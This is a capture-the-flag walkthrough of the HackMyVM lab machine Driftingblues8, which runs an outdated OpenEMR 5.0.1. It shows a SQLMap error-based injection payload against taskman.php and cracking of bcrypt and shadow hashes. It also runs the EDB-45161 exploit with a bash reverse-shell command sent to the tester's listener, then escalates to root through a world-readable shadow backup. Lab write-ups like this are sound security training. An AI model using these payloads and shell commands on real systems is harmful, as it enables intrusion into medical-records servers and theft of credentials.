# Driftingblues8

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Driftingblues8 | tasiyanci | Beginner | HackMyVM |

**Summary:** Driftingblues8 is a beginner-level vulnerable machine featuring an outdated OpenEMR 5.0.1 (3) installation running on Debian. The exploitation path begins with network enumeration revealing a web server hosting the medical records application. Initial reconnaissance uncovers a custom wordlist on the server, which becomes critical for password cracking later. The attack leverages an error-based SQL injection vulnerability in OpenEMR's `taskman.php` endpoint to extract administrator credentials from the database. After cracking the bcrypt hash using the discovered wordlist, authenticated remote code execution is achieved through a known OpenEMR exploit (EDB-45161), granting a reverse shell as the `www-data` user. Privilege escalation to the `clapton` user is accomplished by exploiting a world-readable shadow backup file in `/var/backups/`, which contains password hashes. The final root compromise follows the same pattern—cracking the root hash from the backup file using an extended wordlist found in the `clapton` home directory. This machine demonstrates classic attack chains including SQL injection, credential reuse, insecure file permissions, and the dangers of backup files with excessive read permissions.

---

## Reconnaissance

### Network Discovery

The first step in any penetration test is identifying live hosts on the network. Using a custom PowerShell network scanner, the target machine was discovered:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.92 08:00:27:82:DA:97 VirtualBox
```

The scan identified **192.168.100.92** as a VirtualBox VM, confirming the target's presence on the network.

### Port Enumeration

A comprehensive Nmap scan was executed to identify open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ nmap -sC -sV -p- -T4 192.168.100.92
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-07 21:26 WIB
Nmap scan report for 192.168.100.92
Host is up (0.0095s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: OpenEMR Login
|_Requested resource was interface/login/login.php?site=default

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 578.78 seconds
```

**Key Findings:**
- **Single open port:** TCP 80 (HTTP)
- **Web server:** Apache 2.4.38 running on Debian
- **Application:** OpenEMR (Electronic Medical Records system)
- **Automatic redirect:** The page redirects to `interface/login/login.php?site=default`, indicating an authentication portal

### Web Application Discovery

Accessing the web server on port 80 revealed the OpenEMR login interface:

![openemr](image.png)

The login page confirms the presence of OpenEMR, a widely-used open-source medical records application that has historically been plagued with security vulnerabilities.

### Directory Enumeration

To discover hidden directories and files, a comprehensive directory bruteforce was performed using `dirsearch`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ dirsearch -u http://192.168.100.92/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -e php,txt -t 50 --random-agent -f
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 350596

Output File: /tmp/driftingblues8/reports/http_192.168.100.92/__26-02-07_20-41-06.txt

Target: http://192.168.100.92/

[20:41:06] Starting:
[20:41:07] 200 -  967B  - /images/
[20:41:09] 301 -  320B  - /templates  ->  http://192.168.100.92/templates/
[20:41:09] 301 -  319B  - /services  ->  http://192.168.100.92/services/
[20:41:09] 200 -  606B  - /templates/
[20:41:09] 200 -  569B  - /services/
[20:41:10] 403 -  279B  - /icons/
[20:41:10] 301 -  317B  - /images  ->  http://192.168.100.92/images/
[20:41:13] 301 -  318B  - /modules  ->  http://192.168.100.92/modules/
[20:41:13] 200 -  458B  - /modules/
[20:41:13] 301 -  317B  - /common  ->  http://192.168.100.92/common/
[20:41:13] 200 -  499B  - /common/
[20:41:16] 301 -  318B  - /library  ->  http://192.168.100.92/library/
[20:41:17] 301 -  317B  - /public  ->  http://192.168.100.92/public/
[20:41:18] 200 -  469B  - /public/
[20:41:19] 200 -    0B  - /version.php
[20:41:19] 200 -    2KB - /library/
[20:41:19] 200 -  518B  - /admin.php
[20:41:23] 301 -  317B  - /portal  ->  http://192.168.100.92/portal/
[20:41:28] 301 -  316B  - /tests  ->  http://192.168.100.92/tests/
[20:41:28] 200 -  508B  - /tests/
[20:41:30] 301 -  316B  - /sites  ->  http://192.168.100.92/sites/
[20:41:30] 200 -  449B  - /sites/
[20:41:46] 301 -  317B  - /custom  ->  http://192.168.100.92/custom/
[20:41:46] 200 -  822B  - /custom/
[20:42:05] 301 -  318B  - /contrib  ->  http://192.168.100.92/contrib/
[20:42:07] 200 -  565B  - /contrib/
[20:42:19] 301 -  320B  - /interface  ->  http://192.168.100.92/interface/
[20:42:20] 200 -   37B  - /interface/
[20:42:23] 301 -  317B  - /vendor  ->  http://192.168.100.92/vendor/
[20:42:23] 301 -  317B  - /config  ->  http://192.168.100.92/config/
[20:42:23] 200 -  477B  - /config/
[20:42:24] 200 -  805B  - /vendor/
[20:42:47] 200 -  673B  - /setup.php
[20:43:07] 301 -  324B  - /Documentation  ->  http://192.168.100.92/Documentation/
[20:43:07] 200 -  912B  - /Documentation/
[20:43:23] 301 -  314B  - /sql  ->  http://192.168.100.92/sql/
[20:43:23] 200 -    1KB - /sql/
[20:43:39] 200 -   37B  - /controller.php
[20:43:43] 200 -   34KB - /LICENSE
[20:43:54] 200 -  512B  - /ci/
[20:43:54] 301 -  313B  - /ci  ->  http://192.168.100.92/ci/
[20:45:17] 301 -  316B  - /cloud  ->  http://192.168.100.92/cloud/
[20:45:18] 200 -  457B  - /cloud/
[20:50:50] 301 -  314B  - /ccr  ->  http://192.168.100.92/ccr/
[20:50:50] 200 -  693B  - /ccr/
[20:57:34] 301 -  319B  - /patients  ->  http://192.168.100.92/patients/
[20:57:35] 200 -   28B  - /patients/
[21:01:05] 301 -  323B  - /repositories  ->  http://192.168.100.92/repositories/
[21:01:05] 200 -  545B  - /repositories/
[21:03:22] 301 -  319B  - /myportal  ->  http://192.168.100.92/myportal/
[21:03:23] 200 -   28B  - /myportal/
[21:04:41] 301 -  322B  - /controllers  ->  http://192.168.100.92/controllers/
[21:04:41] 200 -  653B  - /controllers/
[21:08:43] 301 -  319B  - /entities  ->  http://192.168.100.92/entities/
[21:08:43] 200 -  531B  - /entities/
[21:09:05] 200 -    5KB - /wordlist.txt

Task Completed
```

**Critical Discovery:** The scan revealed **`/wordlist.txt`** (5KB), a custom wordlist hosted on the server. This file was immediately downloaded as it could be useful for password cracking:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ curl -O http://192.168.100.92/wordlist.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 14394 100 14394   0     0 270294     0  --:--:-- --:--:-- --:--:-- 271584
```

The wordlist was successfully retrieved and saved for later use.

### Version Identification

Visiting `http://192.168.100.92/admin.php` exposed critical version information:

![version](image-1.png)

**Confirmed Version:** OpenEMR 5.0.1 (3)

This version is known to be vulnerable to multiple exploits, including SQL injection and authenticated remote code execution.

---

## Initial Access

### Vulnerability Research

Research into OpenEMR 5.0.1 vulnerabilities led to the discovery of a Metasploit module for SQL injection:

**Exploit Reference:** https://github.com/rapid7/metasploit-framework/blob/master//modules/auxiliary/sqli/openemr/openemr_sqli_dump.rb

The Metasploit module exploits an error-based SQL injection vulnerability in the `taskman.php` endpoint. Examining the module's source code revealed the vulnerable parameter and payload structure:

```ruby
def get_response(payload)
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(uri, 'interface', 'forms', 'eye_mag', 'taskman.php'),
      'vars_get' => {
        'action' => 'make_task',
        'from_id' => '1',
        'to_id' => '1',
        'pid' => '1',
        'doc_type' => '1',
        'doc_id' => '1',
        'enc' => "1' and updatexml(1,concat(0x7e, (#{payload})),0) or '"
      }
    )
  end
```

The **`enc`** parameter is vulnerable to error-based SQL injection using the `updatexml()` function.

### SQL Injection Exploitation

Instead of using Metasploit (which would require downloading 200+ database tables), **SQLMap** was used for more efficient extraction. The vulnerable endpoint was targeted:

**Vulnerable URL:**
```
http://192.168.100.92/interface/forms/eye_mag/taskman.php?action=make_task&from_id=1&to_id=1&pid=1&doc_type=1&doc_id=1&enc=1
```

**Step 1: Database Enumeration**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ sqlmap -u 'http://192.168.100.92/interface/forms/eye_mag/taskman.php?action=make_task&from_id=1&to_id=1&pid=1&doc_type=1&doc_id=1&enc=1' -p enc --technique=E --dbms=mysql --batch --current-db --threads=10 -o
...
---
Parameter: enc (GET)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=make_task&from_id=1&to_id=1&pid=1&doc_type=1&doc_id=1&enc=1' AND (SELECT 5823 FROM(SELECT COUNT(*),CONCAT(0x717a716b71,(SELECT (ELT(5823=5823,1))),0x716a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'YvAg'='YvAg
---
...
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
...
current database: 'openemr'
...
```

**Key Information:**
- **Backend:** MariaDB (MySQL >= 5.0)
- **Current Database:** `openemr`
- **Injection Type:** Error-based SQL injection confirmed

**Step 2: Table Enumeration**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ sqlmap -u 'http://192.168.100.92/interface/forms/eye_mag/taskman.php?action=make_task&from_id=1&to_id=1&pid=1&doc_type=1&doc_id=1&enc=1' -p enc --technique=E --dbms=mysql --batch -D openemr --tables
...
Database: openemr
[234 tables]
+---------------------------------------+
| array                                 |
| groups                                |
| log                                   |
...........[OUTPUT TRUNCATED]............
| user_settings                         |
| users                                 |
| users_facility                        |
| users_secure                          |
| valueset                              |
| voids                                 |
| x12_partners                          |
+---------------------------------------+
...
```

The database contains 234 tables. The **`users_secure`** table is of particular interest as it likely contains authentication credentials.

**Step 3: Credential Extraction**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ sqlmap -u 'http://192.168.100.92/interface/forms/eye_mag/taskman.php?action=make_task&from_id=1&to_id=1&pid=1&doc_type=1&doc_id=1&enc=1' -p enc --technique=E --dbms=mysql --batch -D openemr -T users,users_secure --dump
...
Database: openemr
Table: users_secure
[1 entry]
+----+--------------------------------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+-------------------+-------------------+
| id | salt                           | password                                                     | username | last_update         | salt_history1 | salt_history2 | password_history1 | password_history2 |
+----+--------------------------------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+-------------------+-------------------+
| 1  | $2a$05$.[REDACTED]B$           | $2a$05$.[REDACTED].2E049sE5jUaknc7aRqOOdQHLX61F.p.           | admin    | 2021-04-25 14:30:27 | NULL          | NULL          | NULL              | NULL              |
+----+--------------------------------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+-------------------+-------------------+
...
```

**Successfully extracted:**
- **Username:** `admin`
- **Password Hash:** `$2a$05$.[REDACTED].2E049sE5jUaknc7aRqOOdQHLX61F.p.`
- **Hash Type:** bcrypt (`$2a$`)

### Password Cracking

The bcrypt hash was saved to a file and cracked using **John the Ripper** with the previously discovered wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ echo '$2a$05$.[REDACTED].2E049sE5jUaknc7aRqOOdQHLX61F.p.' > hash.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ john --wordlist=wordlist.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
.:[REDACTED]   (?)
1g 0:00:00:00 DONE (2026-02-08 02:29) 2.777g/s 1400p/s 1400c/s 1400C/s rico0212..ricnur
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Successfully cracked password:** `.:[REDACTED]`

The custom wordlist proved essential—without it, the password would have been nearly impossible to crack.

### Authentication & Dashboard Access

Using the cracked credentials (`admin:.:[REDACTED]`), successful authentication was achieved:

![dashboard admin](image-2.png)

The dashboard confirms administrative access to the OpenEMR system, enabling further exploitation.

### Authenticated Remote Code Execution

With admin credentials, the next step was achieving code execution. Searching for authenticated OpenEMR exploits revealed multiple options:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ searchsploit openemr 5.0.1
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 5.0.1 - 'controller' Remote Code Execution                                             | php/webapps/48623.txt
OpenEMR 5.0.1 - Remote Code Execution (1)                                                      | php/webapps/48515.py
OpenEMR 5.0.1 - Remote Code Execution (Authenticated) (2)                                      | php/webapps/49486.rb
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                    | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)                | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                       | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                                        | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                        | php/webapps/45161.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)                                    | php/webapps/50037.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated) (2)                                | php/webapps/50087.rb
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

**Selected Exploit:** EDB-45161 (OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated))

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ searchsploit -m php/webapps/45161.py
  Exploit: OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/45161
     Path: /usr/share/exploitdb/exploits/php/webapps/45161.py
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /tmp/driftingblues8/45161.py
```

**Setting up a listener:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
```

**Executing the exploit:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ python2 45161.py -u admin -p '.:[REDACTED]' -c "bash -i >& /dev/tcp/192.168.100.1/4444 0>&1" http://192.168.100.92/
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__)

   ={   P R O J E C T    I N S E C U R I T Y   }=

         Twitter : @Insecurity
         Site    : insecurity.sh

[$] Authenticating with admin:.:[REDACTED]
[$] Injecting payload
```

**Reverse shell received:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 56145
bash: cannot set terminal process group (485): Inappropriate ioctl for device
bash: no job control in this shell
www-data@driftingblues:/var/www/html/interface/main$
```

**Shell Upgrade:**

For better interaction, the shell was upgraded to a fully interactive TTY:

```bash
www-data@driftingblues:/var/www/html/interface/main$ python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'
<' || python -c 'import pty; pty.spawn("/bin/bash")'
www-data@driftingblues:/var/www/html/interface/main$ ^Z
zsh: suspended  nc -nvlp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ stty raw -echo; fg
[1]  + continued  nc -nvlp 4444

www-data@driftingblues:/var/www/html/interface/main$ export SHELL=bash
<www/html/interface/main$ export TERM=xterm-256color
www-data@driftingblues:/var/www/html/interface/main$ stty rows 50 cols 200
www-data@driftingblues:/var/www/html/interface/main$ reset
```

---

## Privilege Escalation

### User Enumeration

Checking the system users revealed a potential target:

```bash
www-data@driftingblues:/var/www/html/interface/main$ cat /etc/passwd
...
clapton:x:1000:1000:,,,:/home/clapton:/bin/bash
```

The **`clapton`** user exists and has a home directory. Privilege escalation to this user became the next objective.

### Discovering Shadow Backup

Exploring the `/var` directory revealed an interesting finding in `/var/backups/`:

```bash
www-data@driftingblues:/var/www/html$ cd /var
www-data@driftingblues:/var$ ls -la
total 48
drwxr-xr-x 12 root root  4096 Apr 25  2021 .
drwxr-xr-x 18 root root  4096 Apr 25  2021 ..
drwxr-xr-x  2 root root  4096 Feb  7 03:32 backups
drwxr-xr-x 10 root root  4096 Apr 25  2021 cache
drwxr-xr-x 27 root root  4096 Apr 25  2021 lib
drwxrwsr-x  2 root staff 4096 Mar 19  2021 local
lrwxrwxrwx  1 root root     9 Apr 25  2021 lock -> /run/lock
drwxr-xr-x  7 root root  4096 Apr 25  2021 log
drwxrwsr-x  2 root mail  4096 Apr 25  2021 mail
drwxr-xr-x  2 root root  4096 Apr 25  2021 opt
lrwxrwxrwx  1 root root     4 Apr 25  2021 run -> /run
drwxr-xr-x  4 root root  4096 Apr 25  2021 spool
drwxrwxrwt  2 root root  4096 Feb  7 08:07 tmp
drwxr-xr-x  3 root root  4096 Apr 25  2021 www
www-data@driftingblues:/var$ cd backups/
www-data@driftingblues:/var/backups$ ls -la
total 28
drwxr-xr-x  2 root root  4096 Feb  7 03:32 .
drwxr-xr-x 12 root root  4096 Apr 25  2021 ..
-rw-r--r--  1 root root 13873 Apr 25  2021 apt.extended_states.0
-rw-r--r--  1 root root   943 Apr 25  2021 shadow.backup
www-data@driftingblues:/var/backups$ cat shadow.backup
root:$6$sqB[REDACTED]gMp.:18742:0:99999:7:::
...
clapton:$6$/eeR7/4JG[REDACTED]ysP/9JBjMkdXT/:18742:0:99999:7:::
```

**Critical Security Flaw:** The **`shadow.backup`** file contains password hashes for all users, including `root` and `clapton`, and has **world-readable permissions** (`-rw-r--r--`). This is a severe misconfiguration allowing any user (including `www-data`) to read sensitive password hashes.

**Extracted hashes:**
- **Root:** `$6$sqB[REDACTED]gMp.`
- **Clapton:** `$6$/eeR7/4JG[REDACTED]ysP/9JBjMkdXT/`

### Cracking Clapton's Password

The extracted hash for `clapton` was saved and cracked using John the Ripper with the rockyou wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ echo 'clapton:$6$/eeR7/4JG[REDACTED]ysP/9JBjMkdXT/' > clapton_hash.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt clapton_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:25 0.25% (ETA: 05:40:12) 0g/s 1725p/s 1725c/s 1725C/s 02071991..guapito
0g 0:00:02:09 1.01% (ETA: 06:28:02) 0g/s 1333p/s 1333c/s 1333C/s florida69..dodos
dr[REDACTED]     (clapton)
1g 0:00:02:45 DONE (2026-02-08 02:58) 0.006046g/s 1343p/s 1343c/s 1343C/s erwing..dodolipet
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Cracked password:** `dr[REDACTED]`

### Privilege Escalation to Clapton

Using the cracked credentials, privilege escalation to `clapton` was successful:

```bash
clapton@driftingblues:~$ id
uid=1000(clapton) gid=1000(clapton) groups=1000(clapton)
clapton@driftingblues:~$ ls -la
total 1440
drwx------ 3 clapton clapton    4096 Feb  7 14:59 .
drwxr-xr-x 3 root    root       4096 Apr 25  2021 ..
-rw------- 1 clapton clapton      58 Apr 25  2021 .bash_history
drwx------ 3 clapton clapton    4096 Feb  7 14:59 .gnupg
-rw-r--r-- 1 clapton clapton      32 Apr 25  2021 user.txt
-rwsr-xr-x 1 root    root      17824 Apr 25  2021 waytoroot
-rw-r--r-- 1 clapton clapton 1431736 Apr 25  2021 wordlist.txt
```

**Notable files:**
- **user.txt** - User flag
- **waytoroot** - SUID binary (likely a hint/rabbit hole)
- **wordlist.txt** - Extended wordlist (1.4MB, much larger than the web version)

### Root Password Cracking

The extended `wordlist.txt` in clapton's home directory was transferred to the attacking machine:

```bash
clapton@driftingblues:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.100.1 - - [07/Feb/2026 15:00:43] "GET /wordlist.txt HTTP/1.1" 200 -
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ curl http://192.168.100.92:8080/wordlist.txt -o wordlist_clapton.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1398k 100  1398k   0     0 311282     0   0:00:04  0:00:04 --:--:-- 311314

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ ls -la wordlist_clapton.txt
-rw-r--r-- 1 ouba ouba 1431736 Feb  8 03:01 wordlist_clapton.txt
```

The root hash (from the shadow backup) was cracked using this extended wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ echo 'root:$6$sqB[REDACTED]gMp.:18742:0:99999:7:::' > root_hash.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/driftingblues8]
└─$ john --wordlist=wordlist_clapton.txt root_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
.:[REDACTED]      (root)
1g 0:00:00:37 DONE (2026-02-08 03:03) 0.02642g/s 1556p/s 1556c/s 1556C/s kruimel..bluelady
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Cracked root password:** `.:[REDACTED]`

### Root Access

With the root password cracked, full system compromise was achieved:

```bash
clapton@driftingblues:~$ su - root
Password:
root@driftingblues:~# id ; whoami; hostname
uid=0(root) gid=0(root) groups=0(root)
root
driftingblues
root@driftingblues:~# cat /root/root.txt; echo; cat /home/clapton/user.txt; echo
E8E[REDACTED]
967[REDACTED]
```

**Flags captured:**
- **User flag:** `967[REDACTED]`
- **Root flag:** `E8E[REDACTED]`

---

## Attack Chain Summary

1. **Reconnaissance:** Performed network discovery identifying the target at 192.168.100.92. Nmap scan revealed Apache 2.4.38 on Debian hosting OpenEMR on port 80. Directory enumeration uncovered `/admin.php` revealing version 5.0.1 (3) and a critical `/wordlist.txt` file containing custom passwords.

2. **Vulnerability Discovery:** Researched OpenEMR 5.0.1 vulnerabilities and identified an error-based SQL injection in the `taskman.php` endpoint's `enc` parameter. Analyzed Metasploit module code to understand the injection vector and craft SQLMap commands.

3. **Exploitation:** Leveraged SQLMap to exploit the SQL injection, extracting the `users_secure` table containing the admin user's bcrypt hash (`$2a$05$..`). Cracked the hash using John the Ripper with the discovered custom wordlist, obtaining credentials `admin:.:[REDACTED]`.

4. **Internal Enumeration:** Authenticated to OpenEMR as administrator. Located and deployed EDB-45161 (authenticated RCE exploit) to inject a bash reverse shell payload, gaining initial foothold as `www-data`. Discovered world-readable shadow backup at `/var/backups/shadow.backup` containing password hashes for all system users.

5. **Privilege Escalation:** Extracted `clapton` user hash from the shadow backup and cracked it with rockyou.txt, obtaining password `dr[REDACTED]`. Switched to clapton user and discovered an extended 1.4MB wordlist in the home directory. Used this wordlist to crack the root hash from the same shadow backup, obtaining root password `.:[REDACTED]` and achieving full system compromise.

